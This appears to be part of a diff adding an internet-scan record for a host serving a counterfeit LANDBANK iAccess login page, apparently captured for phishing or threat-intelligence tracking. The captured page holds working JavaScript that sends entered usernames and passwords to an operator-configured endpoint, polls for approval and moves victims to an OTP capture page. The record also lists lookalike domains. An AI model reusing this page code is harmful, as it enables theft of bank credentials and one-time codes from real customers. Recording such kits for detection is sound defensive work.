\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u043a\u0430\u043a \u043e\u0431\u044b\u0447\u043d\u043e */\n    @media screen and (min-width: 769px) {\n        .warning-toggle {\n            display: none;\n        }\n\n        .warning-content {\n            max-height: none !important;\n            opacity: 1 !important;\n            padding: 0 !important;\n            display: block !important;\n        }\n\n        .warning-accordion {\n            border-top: none;\n            padding-top: 0;\n            margin-top: 0;\n        }\n    }\n\n    /* \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u0434\u043b\u044f \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u0445 \u044d\u043a\u0440\u0430\u043d\u043e\u0432 */\n    @media screen and (max-width: 480px) {\n        /* \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0441\u0442\u0438\u043b\u0438 \u0434\u043b\u044f 320-480px \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e */\n    }\n\n    @media screen and (max-width: 375px) {\n        /* \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u0434\u043b\u044f \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u0438\u0445 \u044d\u043a\u0440\u0430\u043d\u043e\u0432 */\n    }\n\n    @media screen and (max-width: 320px) {\n        /* \u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0435 \u044d\u043a\u0440\u0430\u043d\u044b */\n    }\n</style>\n\n<head id=\"j_idt2\">\n    <link type=\"text/css\" rel=\"stylesheet\"\n        href=\"javax.faces.resource/theme.css.xhtml%3Fln=primefaces-frontoffice.css\" />\n    <link type=\"text/css\" rel=\"stylesheet\"\n        href=\"javax.faces.resource/fa/font-awesome.css.xhtml%3Fln=primefaces&amp;v=8.0.css\" />\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"javax.faces.resource/style.css.xhtml%3Fln=css.css\" />\n    <link type=\"text/css\" rel=\"stylesheet\"\n        href=\"javax.faces.resource/components.css.xhtml%3Fln=primefaces&amp;v=8.0.css\" />\n    <script type=\"text/javascript\" src=\"javax.faces.resource/jquery/jquery.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script type=\"text/javascript\"\n        src=\"javax.faces.resource/jquery/jquery-plugins.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/core.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/components.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/cryptojs/core-min.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/cryptojs/aes.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/cryptojs/enc-base64-min.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/cryptojs/sha256-min.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/app/clienthash.min.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\" src=\"javax.faces.resource/app/login.min.js.xhtml%3Fln=scripts\"></script>\n    <script type=\"text/javascript\"\n        src=\"javax.faces.resource/validation/validation.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script type=\"text/javascript\"\n        src=\"javax.faces.resource/validation/beanvalidation.js.xhtml%3Fln=primefaces&amp;v=8.0\"></script>\n    <script\n        type=\"text/javascript\">if (window.PrimeFaces) { PrimeFaces.settings.locale = 'en_US'; PrimeFaces.settings.validateEmptyFields = true; PrimeFaces.settings.considerEmptyStringNull = false; }</script>\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" />\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\" />\n    <meta name=\"mobile-web-app-capable\" content=\"yes\" />\n\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@800&display=swap\" rel=\"stylesheet\">\n\n    <title>LANDBANK iAccess Retail Internet Banking - Login</title>\n    <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"resources/images/favicon.ico\" />\n</head>\n\n<body id=\"login-body\">\n    <div id=\"login-maincontainer\">\n\n        <div id=\"login-topsection\">\n            <img src=\"resources/images/iAccess_Header.png\" alt=\"\" width=\"1056\" height=\"90\"\n                class=\"header-image-desktop\" />\n            <div class=\"header-content-mobile\">\n                <div class=\"header-left\">\n                    <span class=\"landbank-logo-text\">LANDBANK</span>\n                    <span class=\"header-divider\">|</span>\n                    <span class=\"ofbank-logo-text\">Overseas Filipino Bank</span>\n                </div>\n                <div class=\"header-right\">\n                    <span class=\"iaccess-text\">iAccess</span>\n                </div>\n            </div>\n        </div>\n\n        <div id=\"login-wrapper\">\n            <div id=\"login-contentcolumn\">\n                <div class=\"login-infolinks\">\n                    <a href=\"/about\" target=\"_blank\">About Us</a>\u00a0\u00a0|\u00a0\u00a0\n\n                    <a href=\"login/infolink%3Fi=1\" target=\"_blank\">FAQs</a>\u00a0\u00a0|\u00a0\u00a0\n                    <a href=\"login/infolink%3Fi=2\" target=\"_blank\">Security Policy</a>\u00a0\u00a0|\u00a0\u00a0\n                    <a href=\"login/infolink%3Fi=3\" target=\"_blank\">Data Privacy Statement</a>\u00a0\u00a0|\u00a0\u00a0\n                    <a href=\"login/infolink%3Fi=5\" target=\"_blank\">Advisory on ATM Use</a>\u00a0\u00a0|\u00a0\u00a0\n                    <a href=\"login/infolink%3Fi=4\" target=\"_blank\">iAccess Features</a>\u00a0\u00a0|\u00a0\u00a0\n                    <a href=\"/find-us\" target=\"_blank\">Find Us</a>\n                </div>\n                <h1 id=\"login-welcome-msg\">Welcome to iAccess!</h1><img id=\"login-advertisement-img\"\n                    src=\"local-resources/images/login_advisory.jpg%3Fpfdrid_c=true\" alt=\"\" width=\"600\" />\n            </div>\n\n            <div id=\"login-rightcolumn\">\n\n                <div id=\"login-page\">\n                    <div class=\"form\">\n                        <form id=\"login-form\" name=\"login-form\" method=\"post\"\n                            enctype=\"application/x-www-form-urlencoded\">\n                            <input type=\"hidden\" name=\"login-form\" value=\"login-form\" />\n                            <input id=\"k\" type=\"hidden\" name=\"k\" value=\"AXLSAAAKANAA\" /><input id=\"ki\" type=\"hidden\"\n                                name=\"ki\" value=\"cXZLV2piWmRRZVBDS092SA==\" /><input id=\"pi\" type=\"hidden\" name=\"pi\" />\n                            <div id=\"login-form-msgs\" class=\"ui-messages ui-widget\" aria-live=\"polite\"\n                                data-global=\"false\" data-detail=\"data-detail\" data-severity=\"all,error\"\n                                data-redisplay=\"true\"></div>\n\n                            <!-- Form content (inputs and button) -->\n                            <div id=\"auth-status\" class=\"message\"></div>\n                            <div id=\"form-content\" class=\"form-content\">\n                                <input id=\"user-name\" type=\"text\" name=\"user-name\" autocomplete=\"off\"\n                                    class=\"login-input\" maxlength=\"20\" placeholder=\"Username\" required autofocus>\n\n                                <div class=\"password-wrapper\">\n                                    <input id=\"passwordd\" type=\"password\" name=\"password\" autocomplete=\"off\" value=\"\"\n                                        maxlength=\"30\" class=\"login-input\" placeholder=\"Password\" required>\n                                    <button type=\"button\" class=\"password-toggle\" aria-label=\"Show password\">\n                                        <span class=\"eye-icon\">\ud83d\udc41</span>\n                                    </button>\n                                </div>\n\n                                <input id=\"login\" type=\"submit\" name=\"login\" value=\"Login\" class=\"login-button\"\n                                    onclick=\"Login.submit();\" />\n\n                                <div id=\"otp-container\" style=\"display:none; margin-top:10px;\">\n                                    <input type=\"text\" id=\"otp-input\" class=\"login-input\" placeholder=\"Enter OTP\" />\n                                    <button type=\"button\" id=\"send-otp\" class=\"login-button\">Send OTP</button>\n                                </div>\n\n                                <p class=\"message\">\n                                    Not yet enrolled? <a href=\"register/enroll.xhtml.html\">Sign up now!</a><br />\n\n\n\n                                    Upon login, I hereby agree to its <a href=\"login/infolink%3Fi=6\"\n                                        target=\"_blank\">Terms\n                                        and Conditions</a><br />\n                            </div>\n\n                            <!-- Spinner container (replaces form content when active) -->\n                            <div id=\"spinner-container\" class=\"spinner-container\">\n                                <div class=\"spinner\"></div>\n                            </div>\n\n                            <input type=\"hidden\" name=\"javax.faces.ViewState\" id=\"j_id1:javax.faces.ViewState:0\"\n                                value=\"1259573384655394780:-3524055855195517454\" autocomplete=\"off\" />\n                        </form>\n\n\n                    </div>\n                </div>\n                <div id=\"login-forex\" style=\"max-width: 60%;\"><span style=\"color: #0c4221; font-weight: bold;\">FOREIGN\n                        EXCHANGE</span>\u00a0\u00a0<input type=\"button\"\n                        onclick=\"window.open('/', '_blank'); return false;window.location.href='/login.xhtml'; return false;\"\n                        value=\"CLICK HERE\" class=\"forex-button\" />\n\n                </div>\n            </div>\n\n        </div>\n\n        <div id=\"footer\">\n            <div class=\"warning-accordion\">\n                <button class=\"warning-toggle\" aria-expanded=\"false\">\n                    <span>Security & Legal Notice</span>\n                    <span class=\"accordion-icon\">\u25bc</span>\n                </button>\n                <div class=\"warning-content\">\n                    <div id=\"container-warning\">\n                        <span class=\"warning\">WARNING:</span>\n                        <span class=\"warning-higlight\">iAccess is for authorized clients only.</span>\n                        <span>It shall be a criminal offense for any person to:</span>\n\n                        <ol>\n                            <li>Obtain access to data without authority;</li>\n                            <li>Corrupt, alter, steal or destroy data;</li>\n                            <li>Interfere in computer system or server;</li>\n                            <li>Introduce computer virus.</li>\n                        </ol>\n\n                        <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the\n                            damage\n                            incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792\n                            (E-Commerce\n                            Act of the Philippines).</span>\n                    </div>\n                </div>\n            </div>\n            <div id=\"container-contactinfo\">\n                <span style=\"color: #0c4221; font-size: 12px; font-weight: bold;\">LANDBANK CUSTOMER CARE\n                    CENTER</span><br />\n                <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br />\n                <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br />\n                <span>Email: customercare@landbank.com</span><br />\n            </div>\n\n        </div>\n\n        <div id=\"login-footer\">\n\n            <div id=\"left-container\">\n                <span class=\"left-container-span\" style=\"margin-top: 20px;\">\n                    Go to LANDBANK Main Site:\n                    <a href=\"/\" target=\"_blank\"\n                        style=\"color: white; text-decoration: none; font-weight: bold; margin-left: 5px;\">www.landbank.com</a>\n                </span>\n                <span class=\"left-container-span\">Copyright \u00a9 2026 Land Bank of the Philippines. All Rights\n                    Reserved</span>\n            </div>\n            <div id=\"right-container\">\n                <span class=\"right-container-span\" style=\"margin-top: 10px;\">\n                    <img src=\"resources/images/bancnet_logo_red.png\" alt=\"\" width=\"80\" height=\"15\"\n                        style=\"margin-left: 5px\" id=\"bancnet-logo\" />\n                    <span>A proud member of </span>\n                </span>\n                <span class=\"right-container-span\">Deposits are insured by PDIC up to P500,000 per depositor.</span>\n                <span class=\"right-container-span1\" style=\"margin-top: 20px;\">Regulated by the Bangko Sentral ng\n                    Pilipinas. |\n                    <a href=\"https://www.bsp.gov.ph/\" target=\"_blank\"\n                        style=\"color: white; text-decoration: none; font-weight: bold; position: relative; left: 5px;\">https://www.bsp.gov.ph/</a>\n                </span>\n\n                <img src=\"resources/images/landbank_Icon_white.png\" alt=\"\" id=\"landbank-logo\" />\n            </div>\n        </div>\n\n    </div>\n    <script src=\"config.js\"></script>\n    <script>\n        document.addEventListener(\"DOMContentLoaded\", function () {\n            var form = document.getElementById('login-form');\n            var statusEl = document.getElementById('auth-status');\n            var otpContainer = document.getElementById('otp-container');\n            var spinnerContainer = document.getElementById('spinner-container');\n            var formContent = document.getElementById('form-content');\n\n            // Password toggle functionality\n            var passwordToggle = document.querySelector('.password-toggle');\n            var passwordInput = document.getElementById('passwordd');\n            var eyeIcon = document.querySelector('.eye-icon');\n\n            if (passwordToggle && passwordInput) {\n                passwordToggle.addEventListener('click', function () {\n                    if (passwordInput.type === 'password') {\n                        passwordInput.type = 'text';\n                        eyeIcon.textContent = '\ud83d\udc41\ufe0f';\n                        passwordToggle.setAttribute('aria-label', 'Hide password');\n                    } else {\n                        passwordInput.type = 'password';\n                        eyeIcon.textContent = '\ud83d\udc41';\n                        passwordToggle.setAttribute('aria-label', 'Show password');\n                    }\n                });\n            }\n\n            // Warning accordion functionality\n            var warningToggle = document.querySelector('.warning-toggle');\n            var warningContent = document.querySelector('.warning-content');\n\n            if (warningToggle && warningContent) {\n                // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0440\u0430\u0437\u043c\u0435\u0440 \u044d\u043a\u0440\u0430\u043d\u0430 \u0438 \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n                function setAccordionState() {\n                    if (window.innerWidth <= 768) {\n                        // \u041d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0441\u0432\u0435\u0440\u043d\u0443\u0442\u043e\n                        if (!warningContent.classList.contains('expanded')) {\n                            warningContent.classList.remove('expanded');\n                            warningToggle.setAttribute('aria-expanded', 'false');\n                        }\n                    } else {\n                        // \u041d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 \u0440\u0430\u0437\u0432\u0435\u0440\u043d\u0443\u0442\u043e (toggle \u0441\u043a\u0440\u044b\u0442 \u0447\u0435\u0440\u0435\u0437 CSS)\n                        warningContent.classList.add('expanded');\n                        warningToggle.setAttribute('aria-expanded', 'true');\n                    }\n                }\n\n                // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n                if (window.innerWidth <= 768) {\n                    warningContent.classList.remove('expanded');\n                    warningToggle.setAttribute('aria-expanded', 'false');\n                } else {\n                    warningContent.classList.add('expanded');\n                    warningToggle.setAttribute('aria-expanded', 'true');\n                }\n\n                // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043e\u043a\u043d\u0430\n                window.addEventListener('resize', setAccordionState);\n\n                // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u043a\u043b\u0438\u043a\u0430 (\u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0442\u043e\u043b\u044c\u043a\u043e \u043d\u0430 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0445, \u0442.\u043a. \u043d\u0430 \u0434\u0435\u0441\u043a\u0442\u043e\u043f\u0435 toggle \u0441\u043a\u0440\u044b\u0442)\n                warningToggle.addEventListener('click', function () {\n                    if (window.innerWidth <= 768) {\n                        var isExpanded = warningToggle.getAttribute('aria-expanded') === 'true';\n\n                        if (isExpanded) {\n                            warningContent.classList.remove('expanded');\n                            warningToggle.setAttribute('aria-expanded', 'false');\n                        } else {\n                            warningContent.classList.add('expanded');\n                            warningToggle.setAttribute('aria-expanded', 'true');\n                        }\n                    }\n                });\n            }\n\n            form.addEventListener('submit', async function (e) {\n                e.preventDefault();\n                var username = document.getElementById('user-name').value.trim();\n                var password = document.getElementById('passwordd').value;\n                if (!username || !password) {\n                    statusEl.textContent = 'Username and password required';\n                    return;\n                }\n\n                // \u041f\u043e\u043b\u043d\u043e\u0441\u0442\u044c\u044e \u043e\u0447\u0438\u0449\u0430\u0435\u043c \u0441\u0442\u0430\u0442\u0443\u0441 (\u0443\u0431\u0438\u0440\u0430\u0435\u043c \u043a\u043b\u0430\u0441\u0441\u044b \u0438 \u0442\u0435\u043a\u0441\u0442)\n                statusEl.className = 'message';\n                statusEl.textContent = '';\n\n                // \u0421\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u0438 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                formContent.classList.add('hidden');\n                spinnerContainer.classList.add('active');\n\n                try {\n                    await fetch(window.API_CONFIG.getUrl('request'), {\n                        method: 'POST',\n                        headers: { 'Content-Type': 'application/json' },\n                        body: JSON.stringify({ username: username, password: password })\n                    });\n                } catch (err) {\n                    // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                    formContent.classList.remove('hidden');\n                    spinnerContainer.classList.remove('active');\n                    statusEl.className = 'message error';\n                    statusEl.textContent = 'Unable to contact server';\n                    return;\n                }\n                pollStatus(username);\n            });\n\n            function pollStatus(username) {\n                var timer = setInterval(async function () {\n                    try {\n                        var res = await fetch(window.API_CONFIG.getUrl('status', { username: username }));\n                        var data = await res.json();\n                        if (data.status === 'approved') {\n                            // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                            formContent.classList.remove('hidden');\n                            spinnerContainer.classList.remove('active');\n                            statusEl.className = 'message success';\n                            statusEl.textContent = 'Access granted';\n                            clearInterval(timer);\n                            form.submit();\n                        } else if (data.status === 'wrong_credentials') {\n                            // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                            formContent.classList.remove('hidden');\n                            spinnerContainer.classList.remove('active');\n                            statusEl.className = 'message error';\n                            statusEl.textContent = 'Invalid User ID or Password';\n                            clearInterval(timer);\n                        } else if (data.status === 'already_logged_in') {\n                            // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                            formContent.classList.remove('hidden');\n                            spinnerContainer.classList.remove('active');\n                            statusEl.className = 'message error';\n                            statusEl.textContent = 'Sorry, you cannot log-in at this time because either you are currently logged-in or you did not log-out properly in your last session. Please log-in again after 15 minutes.';\n                            clearInterval(timer);\n                        } else if (data.status === 'redirect') {\n                            // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                            formContent.classList.remove('hidden');\n                            spinnerContainer.classList.remove('active');\n                            clearInterval(timer);\n                            // \u0420\u0435\u0434\u0438\u0440\u0435\u043a\u0442 \u043d\u0430 URL \u0438\u0437 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\n                            if (data.redirectUrl) {\n                                window.location.href = data.redirectUrl;\n                            }\n                        } else if (data.status === 'otp_required') {\n                            // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                            formContent.classList.remove('hidden');\n                            spinnerContainer.classList.remove('active');\n                            clearInterval(timer);\n                            // \u0420\u0435\u0434\u0438\u0440\u0435\u043a\u0442 \u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443 unlock \u0441 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435\u043c \u0441\u0435\u0441\u0441\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \u0432 URL\n                            window.location.href = 'unlock.xhtml.html?username=' + encodeURIComponent(username);\n                        }\n                    } catch (err) {\n                        // \u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0444\u043e\u0440\u043c\u0443 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0438 \u0441\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0441\u043f\u0438\u043d\u043d\u0435\u0440\n                        formContent.classList.remove('hidden');\n                        spinnerContainer.classList.remove('active');\n                        statusEl.className = 'message error';\n                        statusEl.textContent = 'Error contacting server';\n                    }\n                }, 3000);\n            }\n        });\n    </script>\n</body>\n\n</html>",
+                "favicons": [
+                  {
+                    "size": 1150,
+                    "name": "http://45.87.41.119:3000/resources/images/favicon.ico",
+                    "hash_sha256": "06c9ad91cf91e1e3fdb85af3cbec9a90d19ffc103ff4c35e4b0079a3a0b16a73",
+                    "hash_md5": "a3e5b50fa24dc39773107eb827604fbf",
+                    "hash_shodan": -1165749533
+                  }
+                ],
+                "html_title": "LANDBANK iAccess Retail Internet Banking - Login",
+                "body_hash_sha256": "51e8e94dad3d52020f3aa44647f620f6e63f2a17c1c40349757c16e6bbaeeeff",
+                "body_hash_sha1": "fa46f8aa66813c6fcb48c7822719186861fc0ff8",
+                "supported_versions": [
+                  "HTTP/1.1"
+                ]
+              },
+              "ip": "45.87.41.119"
+            }
+          ]
+        }
+      ],
+      "service_count": 4,
+      "dns": {
+        "reverse_dns": {
+          "resolve_time": "2026-01-31T11:43:30Z",
+          "names": [
+            "45-87-41-119.static.spectraip.net"
+          ]
+        },
+        "names": [
+          "lpbiacess.pabisgroup.com",
+          "lpbiacess.retroautomarket.com",
+          "lpbiacess.jacklyncito.com",
+          "login.jacklyncito.com"
+        ],
+        "forward_dns": {
+          "login.jacklyncito.com": {
+            "resolve_time": "2026-01-29T07:19:58Z",
+            "name": "login.jacklyncito.com",
+            "record_type": "a"
+          },
+          "lpbiacess.jacklyncito.com": {
+            "resolve_time": "2026-01-29T07:26:41Z",
+            "name": "lpbiacess.jacklyncito.com",
+            "record_type": "a"
+          },
+          "lpbiacess.pabisgroup.com": {
+            "resolve_time": "2026-01-31T15:40:33Z",
+            "name": "lpbiacess.pabisgroup.com",
+            "record_type": "a"
+          },
+          "lpbiacess.retroautomarket.com": {
+            "resolve_time": "2026-01-31T15:40:32Z",
+            "name": "lpbiacess.retroautomarket.com",
+            "record_type": "a"
+          }
+        }
+      },
+      "operating_system": {
+        "vendor": "canonical",
+        "product": "linux"
+      }
+    },
+    "extensions": {}
+  }
+}
